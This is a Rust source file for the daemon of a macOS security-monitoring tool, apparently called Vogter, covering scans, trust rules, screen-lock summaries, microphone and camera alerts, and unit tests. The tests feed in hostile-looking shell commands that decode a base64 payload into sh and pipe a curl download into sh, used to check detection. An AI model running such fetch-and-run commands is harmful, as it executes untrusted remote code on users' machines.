use std::sync::mpsc::{Receiver, RecvTimeoutError, Sender};
use std::sync::{Mutex, MutexGuard};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use std::collections::{BTreeSet, HashMap};

use vogter_detect::trust::{Subject, is_trusted, subject_for};
use vogter_ipc::{
    Event, HistoryQuery, MAX_NOTE_CHARS, Message, PROTOCOL_VERSION, ProgramProfile, Realtime,
    Request, Status,
};
use vogter_model::{Activity, ActivityKind, AvState, ExecInfo, Severity, SignatureKind, TrustRule};
use vogter_sensors::hash::sha256_file;

use crate::watch::Signal;
use vogter_store::Store;

/// Shared state of the running service.
pub struct Daemon {
    store: Mutex<Store>,
    live: Mutex<Live>,
    subscribers: Mutex<Vec<Sender<Message>>>,
    scan_tx: Mutex<Sender<()>>,
    away: Mutex<Away>,
    /// Cached copy of the trust table.
    trust: Mutex<Vec<TrustRule>>,
    realtime: Mutex<Realtime>,
    interval: Duration,
    as_root: bool,
    /// This service's own binary and signature, so it doesn't report itself.
    me: Option<(String, vogter_model::Signing)>,
}

/// What happened while the screen was locked.
#[derive(Default)]
struct Away {
    locked_at: Option<u64>,
    alerts: Vec<Activity>,
    /// Non-Apple programs that started.
    programs: BTreeSet<String>,
}

/// The same activity (summary + path) is reported at most once in this window.
const REPEAT_WINDOW_SECS: u64 = 600;
/// First runs of programs are learned silently for this long after install.
const LEARNING_SECS: u64 = 7 * 86_400;
/// A program this familiar gets its low/medium alerts one level lower.
const FAMILIAR_RUNS: u64 = 20;
const FAMILIAR_SECS: u64 = 3 * 86_400;
/// Locks shorter than this don't get a summary.
const AWAY_MIN_SECS: u64 = 60;

#[derive(Default)]
struct Live {
    scanning: bool,
    av: AvState,
    sensor_errors: Vec<String>,
}

/// Findings below this don't generate events (they churn, e.g. ephemeral ports).
const EVENT_MIN_SEVERITY: Severity = Severity::Low;

fn now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// How the `programs` table knows a program: by developer for signed code (so
/// updates stay familiar), by path otherwise.
fn program_identity(path: &str, signing: &vogter_model::Signing) -> String {
    match (&signing.kind, &signing.team_id) {
        (SignatureKind::ThirdParty, Some(team)) => {
            format!(
                "team:{team}:{}",
                signing.identifier.as_deref().unwrap_or("")
            )
        }
        _ => format!("path:{path}"),
    }
}

fn annotation(event_id: i64, state: Option<(Option<String>, Option<u64>)>) -> Message {
    match state {
        Some((note, reviewed_at)) => Message::Annotation {
            event_id,
            note,
            reviewed_at,
        },
        None => Message::Error {
            message: format!("no event {event_id}"),
        },
    }
}

/// How often old history is cleaned up (also once at startup).
const RETENTION_EVERY: Duration = Duration::from_secs(86_400);

fn lock<T>(m: &Mutex<T>) -> MutexGuard<'_, T> {
    // A panicked thread must not take the whole daemon down with poisoned locks.
    m.lock().unwrap_or_else(|e| e.into_inner())
}

impl Daemon {
    pub fn new(store: Store, interval: Duration, as_root: bool, scan_tx: Sender<()>) -> Self {
        let me = std::env::current_exe()
            .ok()
            .and_then(|p| p.canonicalize().ok())
            .map(|p| {
                let path = p.display().to_string();
                let signing =
                    vogter_sensors::codesign::for_pid(std::process::id() as i32, Some(&path));
                (path, signing)
            });
        Daemon {
            me,
            live: Mutex::default(),
            subscribers: Mutex::default(),
            scan_tx: Mutex::new(scan_tx),
            trust: Mutex::new(store.trust_rules().unwrap_or_default()),
            store: Mutex::new(store),
            away: Mutex::default(),
            realtime: Mutex::default(),
            interval,
            as_root,
        }
    }

    pub fn subscribe(&self, tx: Sender<Message>) {
        lock(&self.subscribers).push(tx);
    }

    fn broadcast(&self, msg: Message) {
        lock(&self.subscribers).retain(|tx| tx.send(msg.clone()).is_ok());
    }

    fn emit(&self, event: Event) {
        let logged = lock(&self.store).log_event(now(), event);
        match logged {
            Ok(e) => self.broadcast(Message::Event(e)),
            Err(e) => tracing::error!("logging event: {e}"),
        }
    }

    pub fn handle(&self, req: Request) -> Message {
        let result = match req {
            Request::Status => return Message::Status(self.status()),
            Request::Findings {
                include_acknowledged,
            } => lock(&self.store)
                .active(include_acknowledged)
                .map(|findings| Message::Findings { findings }),
            Request::Events { limit } => lock(&self.store)
                .recent_events(limit.min(1000))
                .map(|events| Message::Events { events }),
            Request::Acknowledge { key } => lock(&self.store).acknowledge(&key).map(|found| {
                if found {
                    Message::Ok
                } else {
                    Message::Error {
                        message: format!("no active finding {key}"),
                    }
                }
            }),
            Request::ScanNow => {
                let _ = lock(&self.scan_tx).send(());
                return Message::Ok;
            }
            Request::Subscribe => unreachable!("handled by the connection"),
            Request::Trust {
                finding_key,
                event_id,
                all_checks,
            } => return self.trust(finding_key, event_id, all_checks),
            Request::TrustRules => {
                return Message::TrustRules {
                    rules: lock(&self.trust).clone(),
                };
            }
            Request::History(q) => {
                lock(&self.store)
                    .history(&q)
                    .map(|(events, next)| Message::History {
                        events,
                        next_before_id: next,
                        token: q.token,
                    })
            }
            Request::HistoryDays { since, until } => lock(&self.store)
                .day_summaries(since, until)
                .map(|days| Message::HistoryDays { days }),
            Request::FindingHistory(q) => {
                lock(&self.store)
                    .finding_history(&q)
                    .map(|findings| Message::FindingHistory {
                        findings,
                        token: q.token,
                    })
            }
            Request::AwayPeriods { since, until } => lock(&self.store)
                .away_periods(since, until)
                .map(|periods| Message::AwayPeriods { periods }),
            Request::ProgramProfile { path } => return self.program_profile(path),
            Request::ChangesSince {
                since,
                min_severity,
            } => lock(&self.store)
                .changes_since(since, min_severity.unwrap_or(Severity::Low))
                .map(Message::Changes),
            Request::Annotate { event_id, note } => return self.annotate(event_id, &note),
            Request::SetReviewed { event_id, reviewed } => lock(&self.store)
                .set_reviewed(event_id, reviewed, now())
                .map(|state| annotation(event_id, state)),
            Request::Untrust { id } => {
                let removed = lock(&self.store).remove_trust(id);
                return match removed {
                    Ok(true) => {
                        lock(&self.trust).retain(|r| r.id != id);
                        let _ = lock(&self.scan_tx).send(());
                        Message::Ok
                    }
                    Ok(false) => Message::Error {
                        message: format!("no trust rule {id}"),
                    },
                    Err(e) => Message::Error {
                        message: e.to_string(),
                    },
                };
            }
        };
        result.unwrap_or_else(|e| Message::Error {
            message: e.to_string(),
        })
    }

    fn annotate(&self, event_id: i64, note: &str) -> Message {
        // Plain text only: no control characters other than line breaks and tabs.
        let note: String = note
            .trim()
            .chars()
            .filter(|c| !c.is_control() || matches!(c, '\n' | '\t'))
            .collect();
        if note.chars().count() > MAX_NOTE_CHARS {
            return Message::Error {
                message: format!("notes are limited to {MAX_NOTE_CHARS} characters"),
            };
        }
        let note = (!note.is_empty()).then_some(note.as_str());
        match lock(&self.store).annotate(event_id, note, now()) {
            Ok(state) => annotation(event_id, state),
            Err(e) => Message::Error {
                message: e.to_string(),
            },
        }
    }

    /// Everything known about the program at `path`.
    fn program_profile(&self, path: String) -> Message {
        let result = (|| -> vogter_store::Result<ProgramProfile> {
            let store = lock(&self.store);
            let (events, _) = store.history(&HistoryQuery {
                program: Some(path.clone()),
                limit: Some(50),
                ..Default::default()
            })?;
            let event_count = store.program_event_count(&path)?;
            let findings = store.active_for_path(&path)?;
            let past_findings = store.finding_history(&HistoryQuery {
                program: Some(path.clone()),
                resolved_only: true,
                limit: Some(20),
                ..Default::default()
            })?;
            let path_identity = format!("path:{path}");
            let recorded = store.program(&path_identity)?;
            drop(store);

            // The signature as last recorded, from its newest event or finding.
            let recorded_signing = events
                .iter()
                .find_map(|e| match &e.event {
                    Event::Activity { activity } => activity.signing.clone(),
                    Event::NewFinding { finding } => finding.finding.signing.clone(),
                    _ => None,
                })
                .or_else(|| findings.iter().find_map(|f| f.finding.signing.clone()))
                .or_else(|| past_findings.iter().find_map(|f| f.finding.signing.clone()));
            let exists = std::path::Path::new(&path).exists();
            // Only look at files Vogter already knows about: this is not a
            // general-purpose signature checker for any path a client names.
            let known = event_count > 0
                || !findings.is_empty()
                || !past_findings.is_empty()
                || recorded.is_some();
            let signing = if known && exists {
                Some(vogter_sensors::codesign::for_path(&path))
            } else {
                recorded_signing
            };
            let familiarity = match &signing {
                Some(s) => match program_identity(&path, s) {
                    id if id != path_identity => lock(&self.store).program(&id)?.or(recorded),
                    _ => recorded,
                },
                None => recorded,
            };
            Ok(ProgramProfile {
                name: path.rsplit('/').next().unwrap_or(&path).to_string(),
                path: path.clone(),
                exists,
                signing,
                familiarity,
                findings,
                past_findings,
                events,
                event_count,
            })
        })();
        match result {
            Ok(p) => Message::ProgramProfile(p),
            Err(e) => Message::Error {
                message: e.to_string(),
            },
        }
    }

    /// Forget old history now and then every [`RETENTION_EVERY`].
    pub fn retention_loop(&self) {
        loop {
            match lock(&self.store).cleanup(now()) {
                Ok(c) => tracing::info!(
                    events = c.events,
                    findings = c.findings,
                    scans = c.scans,
                    notes = c.notes,
                    "old history cleaned up"
                ),
                Err(e) => tracing::error!("cleaning up history: {e}"),
            }
            thread::sleep(RETENTION_EVERY);
        }
    }

    fn status(&self) -> Status {
        let store = lock(&self.store);
        let mut open_counts = [0u32; 5];
        for f in store.active(false).unwrap_or_default() {
            open_counts[f.finding.severity as usize] += 1;
        }
        let live = lock(&self.live);
        Status {
            protocol: PROTOCOL_VERSION,
            version: env!("CARGO_PKG_VERSION").into(),
            as_root: self.as_root,
            scanning: live.scanning,
            last_scan: store.last_scan().ok().flatten(),
            scan_interval_secs: self.interval.as_secs(),
            open_counts,
            av: live.av.clone(),
            sensor_errors: live.sensor_errors.clone(),
            realtime: lock(&self.realtime).clone(),
            learning_until: store.created_at().unwrap_or(0) + LEARNING_SECS,
            trust_rules: lock(&self.trust).len() as u32,
        }
    }

    pub fn set_realtime(&self, r: Realtime) {
        *lock(&self.realtime) = r;
    }

    /// Handle live signals from the watchers / Endpoint Security.
    pub fn signal_loop(&self, rx: Receiver<Signal>) {
        let mut recent: HashMap<String, u64> = HashMap::new();
        for signal in rx {
            match signal {
                Signal::Rescan(why) => {
                    tracing::info!(why, "rescan requested");
                    let _ = lock(&self.scan_tx).send(());
                }
                Signal::Exec(exec) => {
                    if !exec.signing.is_apple() && lock(&self.away).locked_at.is_some() {
                        lock(&self.away).programs.insert(exec.name().to_string());
                    }
                    if let Some(a) = self.assess_exec_with_history(&exec) {
                        let serious = a.severity >= Severity::Medium;
                        self.activity(a, &mut recent);
                        if serious {
                            // Make it a tracked finding too if it's still running at scan time.
                            let _ = lock(&self.scan_tx).send(());
                        }
                    }
                }
                Signal::Activity(a) => self.activity(a, &mut recent),
            }
        }
    }

    /// The exec rules, adjusted by what we know about this program on this Mac.
    fn assess_exec_with_history(&self, exec: &ExecInfo) -> Option<Activity> {
        let assessed = vogter_detect::assess_exec(exec);
        if exec.signing.is_apple() {
            return assessed;
        }
        let identity = program_identity(&exec.path, &exec.signing);
        let t = now();
        let store = lock(&self.store);
        let prior = store.record_program(&identity, exec.name(), t).ok()?;
        let learning = t < store.created_at().unwrap_or(0) + LEARNING_SECS;
        drop(store);

        match (assessed, prior) {
            // Never seen before: worth a note once the learning period is over.
            (Some(mut a), None) => {
                if !learning {
                    a.detail = Some(format!(
                        "{} (first time this program has run here)",
                        a.detail.unwrap_or_default()
                    ));
                }
                Some(a)
            }
            (None, None) if !learning => {
                let severity = if exec.signing.is_weak() {
                    Severity::Low
                } else {
                    Severity::Info
                };
                Some(
                    Activity::new(
                        ActivityKind::ProcessStarted,
                        severity,
                        format!("First run of {}", exec.name()),
                    )
                    .detail(format!("{} — {}", exec.path, exec.signing.describe()))
                    .from_exec(exec),
                )
            }
            // Seen many times over days: low/medium alerts are probably routine here.
            (Some(mut a), Some(h))
                if matches!(a.severity, Severity::Low | Severity::Medium)
                    && h.runs >= FAMILIAR_RUNS
                    && t.saturating_sub(h.first_seen) >= FAMILIAR_SECS =>
            {
                a.severity = a.severity.lower();
                let days = t.saturating_sub(h.first_seen) / 86_400;
                a.detail = Some(format!(
                    "{} (lowered: this program has run {} times over {days} days)",
                    a.detail.unwrap_or_default(),
                    h.runs
                ));
                Some(a)
            }
            (a, _) => a,
        }
    }

    /// A finding about this very service (its Full Disk Access grant, its
    /// LaunchDaemon). Only if the file at that path still has our signature:
    /// a replaced binary is reported like anything else.
    fn is_self(&self, f: &vogter_model::Finding) -> bool {
        let Some((path, signing)) = &self.me else {
            return false;
        };
        f.path.as_deref() == Some(path.as_str()) && signing.kind != SignatureKind::Unknown && {
            let on_disk = vogter_sensors::codesign::for_path(path);
            (on_disk.kind, &on_disk.team_id, &on_disk.identifier)
                == (signing.kind, &signing.team_id, &signing.identifier)
        }
    }

    fn trusted(&self, s: &Subject<'_>) -> bool {
        is_trusted(s, &lock(&self.trust), &sha256_file)
    }

    fn trust(
        &self,
        finding_key: Option<String>,
        event_id: Option<i64>,
        all_checks: bool,
    ) -> Message {
        let store = lock(&self.store);
        let (finding, activity) = match (finding_key, event_id) {
            (Some(k), _) => match store.finding(&k) {
                Ok(Some(f)) => (Some(f.finding), None),
                _ => {
                    return Message::Error {
                        message: format!("no finding {k}"),
                    };
                }
            },
            (None, Some(id)) => match store.event(id) {
                Ok(Some(e)) => match e.event {
                    Event::Activity { activity } => (None, Some(activity)),
                    Event::NewFinding { finding } => (Some(finding.finding), None),
                    _ => {
                        return Message::Error {
                            message: "that event can't be trusted".into(),
                        };
                    }
                },
                _ => {
                    return Message::Error {
                        message: format!("no event {id}"),
                    };
                }
            },
            (None, None) => {
                return Message::Error {
                    message: "give a finding key or an event id".into(),
                };
            }
        };
        let subject = match (&finding, &activity) {
            (Some(f), _) => Subject::from(f),
            (None, Some(a)) => Subject::from(a),
            (None, None) => unreachable!(),
        };
        let (trust_subject, label) = subject_for(&subject, &sha256_file);
        let check = if all_checks {
            "*".to_string()
        } else {
            vogter_detect::trust::family(&subject.check)
        };
        match store.add_trust(&check, &trust_subject, &label, now()) {
            Ok(rule) => {
                drop(store);
                tracing::info!(label = %rule.label, check = %rule.check, "trusted");
                lock(&self.trust).push(rule.clone());
                let _ = lock(&self.scan_tx).send(());
                Message::Trusted { rule }
            }
            Err(e) => Message::Error {
                message: e.to_string(),
            },
        }
    }

    fn activity(&self, a: Activity, recent: &mut HashMap<String, u64>) {
        if self.trusted(&Subject::from(&a)) {
            tracing::debug!(summary = %a.summary, "trusted activity dropped");
            return;
        }
        let t = now();
        let key = format!(
            "{:?}|{}|{}",
            a.kind,
            a.summary,
            a.path.as_deref().unwrap_or("")
        );
        if !matches!(
            a.kind,
            ActivityKind::ScreenLocked | ActivityKind::ScreenUnlocked
        ) && recent
            .get(&key)
            .is_some_and(|&last| t.saturating_sub(last) < REPEAT_WINDOW_SECS)
        {
            return;
        }
        recent.insert(key, t);
        recent.retain(|_, &mut last| t.saturating_sub(last) < REPEAT_WINDOW_SECS);

        let summary = match a.kind {
            ActivityKind::ScreenLocked => {
                *lock(&self.away) = Away {
                    locked_at: Some(t),
                    ..Default::default()
                };
                None
            }
            ActivityKind::ScreenUnlocked => self.away_summary(t),
            _ => {
                let mut away = lock(&self.away);
                if away.locked_at.is_some() && a.severity >= Severity::Low {
                    away.alerts.push(a.clone());
                }
                None
            }
        };
        tracing::info!(kind = ?a.kind, severity = a.severity.as_str(), "{}", a.summary);
        self.emit(Event::Activity { activity: a });
        if let Some(s) = summary {
            self.emit(Event::Activity { activity: s });
        }
    }

    fn away_summary(&self, t: u64) -> Option<Activity> {
        let away = std::mem::take(&mut *lock(&self.away));
        let secs = t.saturating_sub(away.locked_at?);
        if secs < AWAY_MIN_SECS {
            return None;
        }
        let dur = if secs >= 3600 {
            format!("{}h {}m", secs / 3600, secs % 3600 / 60)
        } else {
            format!("{}m", secs / 60)
        };
        let severity = away
            .alerts
            .iter()
            .map(|a| a.severity)
            .max()
            .unwrap_or(Severity::Info);
        let summary = if away.alerts.is_empty() && away.programs.is_empty() {
            format!("Nothing happened while you were away ({dur})")
        } else {
            format!(
                "While you were away ({dur}): {} alert{}, {} program{} started",
                away.alerts.len(),
                if away.alerts.len() == 1 { "" } else { "s" },
                away.programs.len(),
                if away.programs.len() == 1 { "" } else { "s" },
            )
        };
        let mut detail: Vec<String> = away
            .alerts
            .iter()
            .map(|a| format!("[{}] {}", a.severity.as_str(), a.summary))
            .collect();
        if !away.programs.is_empty() {
            detail.push(format!(
                "Programs: {}",
                away.programs.into_iter().collect::<Vec<_>>().join(", ")
            ));
        }
        let mut a = Activity::new(ActivityKind::AwaySummary, severity, summary);
        if !detail.is_empty() {
            a = a.detail(detail.join("\n"));
        }
        Some(a)
    }

    /// Scan now, then every `interval` or whenever a client asks.
    pub fn scan_loop(&self, rx: Receiver<()>) {
        loop {
            self.scan();
            match rx.recv_timeout(self.interval) {
                Ok(()) | Err(RecvTimeoutError::Timeout) => while rx.try_recv().is_ok() {},
                Err(RecvTimeoutError::Disconnected) => return,
            }
        }
    }

    fn scan(&self) {
        lock(&self.live).scanning = true;
        let started = std::time::Instant::now();
        // Sensors run without any lock held; they take about a second.
        let snap = vogter_sensors::snapshot();
        let (findings, trusted): (Vec<_>, Vec<_>) = vogter_detect::assess(&snap)
            .into_iter()
            .filter(|f| !self.is_self(f))
            .partition(|f| !self.trusted(&Subject::from(f)));
        let trusted_keys: std::collections::HashSet<String> =
            trusted.iter().map(|f| f.key()).collect();
        let at = now();
        // A sensor that failed this scan says nothing about the findings it reports:
        // keep those as they were rather than marking them resolved.
        let failed = &snap.sensor_errors;
        let diff = lock(&self.store)
            .record_scan_with(at, &findings, |f| failed.iter().any(|e| e.affects(f)));
        {
            let mut live = lock(&self.live);
            live.scanning = false;
            live.sensor_errors = snap
                .sensor_errors
                .iter()
                .map(|e| format!("{}: {}", e.sensor, e.message))
                .collect();
        }

        let diff = match diff {
            Ok(d) => d,
            Err(e) => {
                tracing::error!("recording scan: {e}");
                return;
            }
        };
        tracing::info!(
            findings = findings.len(),
            new = diff.new.len(),
            resolved = diff.resolved.len(),
            kept_unknown = diff.kept_unknown,
            baseline = diff.baseline,
            ms = started.elapsed().as_millis() as u64,
            "scan complete"
        );
        let (new, resolved) = (diff.new.len() as u32, diff.resolved.len() as u32);
        // The first scan is a baseline: report it as a whole instead of one event per finding.
        if !diff.baseline {
            for f in diff
                .new
                .into_iter()
                .filter(|f| f.finding.severity >= EVENT_MIN_SEVERITY)
            {
                self.emit(Event::NewFinding { finding: f });
            }
            for f in diff
                .resolved
                .into_iter()
                // Trusting something isn't news; it simply stops showing up.
                .filter(|f| {
                    f.finding.severity >= EVENT_MIN_SEVERITY && !trusted_keys.contains(&f.key)
                })
            {
                self.emit(Event::Resolved {
                    key: f.key,
                    title: f.finding.title,
                });
            }
        }
        self.emit(Event::ScanCompleted {
            findings: findings.len() as u32,
            new,
            resolved,
            baseline: diff.baseline,
        });
    }

    /// Poll microphone and camera state and report transitions.
    pub fn av_loop(&self, every: Duration) {
        let mut prev = AvState::default();
        loop {
            let cur = vogter_sensors::av::collect();
            let new_clients = cur
                .microphone_clients
                .iter()
                .any(|c| !prev.microphone_clients.contains(c));
            if cur.microphone_in_use && (!prev.microphone_in_use || new_clients) {
                tracing::info!(clients = ?cur.microphone_clients, "microphone on");
                self.emit(Event::MicrophoneOn {
                    clients: cur.microphone_clients.clone(),
                });
            } else if !cur.microphone_in_use && prev.microphone_in_use {
                self.emit(Event::MicrophoneOff);
            }
            if cur.camera_in_use != prev.camera_in_use {
                tracing::info!(on = cur.camera_in_use, "camera");
                self.emit(if cur.camera_in_use {
                    Event::CameraOn
                } else {
                    Event::CameraOff
                });
            }
            lock(&self.live).av = cur.clone();
            prev = cur;
            thread::sleep(every);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use vogter_model::{ExecInfo, SignatureKind, Signing};

    fn daemon() -> Daemon {
        let (tx, _rx) = std::sync::mpsc::channel();
        Daemon::new(
            Store::in_memory().unwrap(),
            Duration::from_secs(600),
            false,
            tx,
        )
    }

    fn act(kind: ActivityKind, severity: Severity, text: &str) -> Activity {
        Activity::new(kind, severity, text)
    }

    fn events(d: &Daemon) -> Vec<Event> {
        lock(&d.store)
            .recent_events(50)
            .unwrap()
            .into_iter()
            .rev()
            .map(|e| e.event)
            .collect()
    }

    fn summaries(d: &Daemon) -> Vec<Activity> {
        events(d)
            .into_iter()
            .filter_map(|e| match e {
                Event::Activity { activity } if activity.kind == ActivityKind::AwaySummary => {
                    Some(activity)
                }
                _ => None,
            })
            .collect()
    }

    #[test]
    fn away_summary_lists_what_happened() {
        let d = daemon();
        let mut recent = HashMap::new();
        d.activity(
            act(ActivityKind::ScreenLocked, Severity::Info, "Screen locked"),
            &mut recent,
        );
        // Pretend the lock happened 2 hours ago.
        lock(&d.away).locked_at = Some(now() - 7200);
        d.activity(
            act(ActivityKind::Sudo, Severity::Medium, "Failed sudo by x"),
            &mut recent,
        );
        lock(&d.away).programs.insert("evil".into());
        d.activity(
            act(
                ActivityKind::ScreenUnlocked,
                Severity::Info,
                "Screen unlocked",
            ),
            &mut recent,
        );

        let s = summaries(&d);
        assert_eq!(s.len(), 1);
        assert_eq!(s[0].severity, Severity::Medium);
        assert!(
            s[0].summary
                .starts_with("While you were away (2h 0m): 1 alert, 1 program started"),
            "{}",
            s[0].summary
        );
        assert!(s[0].detail.as_deref().unwrap().contains("Programs: evil"));
    }

    #[test]
    fn short_lock_has_no_summary_and_quiet_lock_says_so() {
        let d = daemon();
        let mut recent = HashMap::new();
        d.activity(
            act(ActivityKind::ScreenLocked, Severity::Info, "Screen locked"),
            &mut recent,
        );
        d.activity(
            act(
                ActivityKind::ScreenUnlocked,
                Severity::Info,
                "Screen unlocked",
            ),
            &mut recent,
        );
        assert!(summaries(&d).is_empty());

        d.activity(
            act(ActivityKind::ScreenLocked, Severity::Info, "Screen locked"),
            &mut recent,
        );
        lock(&d.away).locked_at = Some(now() - 300);
        d.activity(
            act(
                ActivityKind::ScreenUnlocked,
                Severity::Info,
                "Screen unlocked",
            ),
            &mut recent,
        );
        let s = summaries(&d);
        assert_eq!(s[0].summary, "Nothing happened while you were away (5m)");
        assert_eq!(s[0].severity, Severity::Info);
    }

    #[test]
    fn repeats_are_suppressed() {
        let d = daemon();
        let mut recent = HashMap::new();
        for _ in 0..3 {
            d.activity(
                act(
                    ActivityKind::Sudo,
                    Severity::Low,
                    "far ran a command as root",
                ),
                &mut recent,
            );
        }
        assert_eq!(events(&d).len(), 1);
    }

    #[test]
    fn suspicious_exec_becomes_activity() {
        let d = daemon();
        let (tx, rx) = std::sync::mpsc::channel();
        tx.send(Signal::Exec(ExecInfo {
            pid: 1,
            ppid: 1,
            uid: 501,
            path: "/bin/zsh".into(),
            args: vec![
                "zsh".into(),
                "-c".into(),
                "echo aGk= | base64 -d | sh".into(),
            ],
            signing: Signing {
                kind: SignatureKind::Apple,
                identifier: None,
                team_id: None,
                notarized: false,
            },
            parent_path: None,
        }))
        .unwrap();
        drop(tx);
        d.signal_loop(rx);
        let ev = events(&d);
        assert!(
            matches!(&ev[0], Event::Activity { activity } if activity.severity == Severity::High),
            "{ev:?}"
        );
    }

    fn adhoc_exec(path: &str) -> ExecInfo {
        ExecInfo {
            pid: 1,
            ppid: 1,
            uid: 501,
            path: path.into(),
            args: vec![],
            signing: Signing {
                kind: SignatureKind::AdHoc,
                identifier: None,
                team_id: None,
                notarized: false,
            },
            parent_path: None,
        }
    }

    #[test]
    fn trusting_an_activity_silences_it() {
        let d = daemon();
        let mut recent = HashMap::new();
        let mut a = act(
            ActivityKind::ProcessStarted,
            Severity::High,
            "tool: runs from a temp folder",
        );
        a.path = Some("/nonexistent/tool".into());
        d.activity(a.clone(), &mut recent);
        let id = lock(&d.store).recent_events(1).unwrap()[0].id;

        let Message::Trusted { rule } = d.trust(None, Some(id), false) else {
            panic!("not trusted")
        };
        // Missing file, no signature: trusted by path, for this check only.
        assert!(matches!(
            rule.subject,
            vogter_model::TrustSubject::File { sha256: None, .. }
        ));
        assert_eq!(rule.check, "process");

        recent.clear();
        d.activity(a, &mut recent);
        assert_eq!(events(&d).len(), 1, "second occurrence should be dropped");

        assert_eq!(d.handle(Request::Untrust { id: rule.id }), Message::Ok);
        assert!(lock(&d.trust).is_empty());
    }

    #[test]
    fn notes_are_plain_and_bounded() {
        let d = daemon();
        let mut recent = HashMap::new();
        d.activity(
            act(ActivityKind::Sudo, Severity::Medium, "Failed sudo by me"),
            &mut recent,
        );
        let id = lock(&d.store).recent_events(1).unwrap()[0].id;
        assert_eq!(
            d.handle(Request::Annotate {
                event_id: id,
                note: "  typo, that was me\u{7}\n ".into()
            }),
            Message::Annotation {
                event_id: id,
                note: Some("typo, that was me".into()),
                reviewed_at: None
            }
        );
        let too_long = "x".repeat(MAX_NOTE_CHARS + 1);
        assert!(matches!(
            d.handle(Request::Annotate {
                event_id: id,
                note: too_long
            }),
            Message::Error { .. }
        ));
        // Exactly at the limit, counted in characters rather than bytes.
        let at_limit = "ø".repeat(MAX_NOTE_CHARS);
        assert!(matches!(
            d.handle(Request::Annotate {
                event_id: id,
                note: at_limit
            }),
            Message::Annotation { note: Some(_), .. }
        ));
        let Message::Annotation { reviewed_at, .. } = d.handle(Request::SetReviewed {
            event_id: id,
            reviewed: true,
        }) else {
            panic!("no annotation")
        };
        assert!(reviewed_at.is_some());
        assert!(matches!(
            d.handle(Request::SetReviewed {
                event_id: 999,
                reviewed: true
            }),
            Message::Error { .. }
        ));
    }

    #[test]
    fn program_profile_gathers_what_is_known() {
        let d = daemon();
        let mut recent = HashMap::new();
        let mut a = act(
            ActivityKind::ProcessStarted,
            Severity::Low,
            "First run of tool",
        );
        a.path = Some("/nonexistent/tool".into());
        a.signing = Some(Signing {
            kind: SignatureKind::AdHoc,
            identifier: None,
            team_id: None,
            notarized: false,
        });
        d.activity(a, &mut recent);
        lock(&d.store)
            .record_program("path:/nonexistent/tool", "tool", 5)
            .unwrap();
        let Message::ProgramProfile(p) = d.handle(Request::ProgramProfile {
            path: "/nonexistent/tool".into(),
        }) else {
            panic!("no profile")
        };
        assert_eq!(p.name, "tool");
        assert!(!p.exists);
        assert_eq!(p.event_count, 1);
        assert_eq!(p.events.len(), 1);
        assert_eq!(p.signing.unwrap().kind, SignatureKind::AdHoc);
        assert_eq!(p.familiarity.unwrap().first_seen, 5);

        // Unknown paths get an empty profile, and no signature check.
        let Message::ProgramProfile(p) = d.handle(Request::ProgramProfile {
            path: "/bin/ls".into(),
        }) else {
            panic!("no profile")
        };
        assert!(p.exists && p.signing.is_none() && p.events.is_empty());
    }

    #[test]
    fn learning_period_then_first_runs_are_reported() {
        let d = daemon();
        // Inside the learning period: an unremarkable program is just recorded.
        assert!(
            d.assess_exec_with_history(&adhoc_exec("/opt/tools/a"))
                .is_none()
        );

        // Pretend we were installed 8 days ago.
        lock(&d.store)
            .conn_for_tests()
            .execute(
                "UPDATE meta SET value = ?1 WHERE key = 'created_at'",
                [(now() - 8 * 86_400).to_string()],
            )
            .unwrap();
        let first = d
            .assess_exec_with_history(&adhoc_exec("/opt/tools/b"))
            .unwrap();
        assert_eq!(
            (first.severity, first.summary.as_str()),
            (Severity::Low, "First run of b")
        );
        // Second run of the same program: nothing new.
        assert!(
            d.assess_exec_with_history(&adhoc_exec("/opt/tools/b"))
                .is_none()
        );
    }

    #[test]
    fn familiar_programs_get_lower_severity() {
        let d = daemon();
        let exec = ExecInfo {
            args: vec![
                "bash".into(),
                "-c".into(),
                "curl -fsSL https://example.com/x | sh".into(),
            ],
            path: "/opt/homebrew/bin/bash".into(),
            ..adhoc_exec("/x")
        };
        let base = vogter_detect::assess_exec(&exec).unwrap().severity;
        assert_eq!(base, Severity::Medium);
        {
            let store = lock(&d.store);
            for i in 0..25 {
                store
                    .record_program(
                        "path:/opt/homebrew/bin/bash",
                        "bash",
                        now() - 5 * 86_400 + i,
                    )
                    .unwrap();
            }
        }
        let a = d.assess_exec_with_history(&exec).unwrap();
        assert_eq!(a.severity, Severity::Low);
        assert!(a.detail.unwrap().contains("lowered"));
    }
}
